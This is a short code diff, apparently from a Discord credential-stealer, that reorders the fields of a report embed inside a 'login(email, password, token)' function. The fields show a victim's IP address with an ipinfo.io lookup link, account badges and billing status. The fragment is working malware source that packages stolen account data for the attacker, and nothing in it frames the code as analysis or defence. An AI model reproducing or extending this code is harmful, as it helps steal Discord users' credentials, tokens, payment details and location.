@@ -598,11 +598,6 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
-            value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
-            inline: true,
-          },
-          {
             name: '<a:satanist:802503618972483615> @SN - Badges:',
             value: `${badges}`,
             inline: true,
@@ -610,6 +605,11 @@ const login = async (email, password, token) => {
           {
             name: '<:944007233820307467:959785232037470208> @SN - Billing:',
             value: `**${billing}**`,
+            inline: true,
+          },
+          {
+            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
+            value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
             inline: true,
           },
         ],
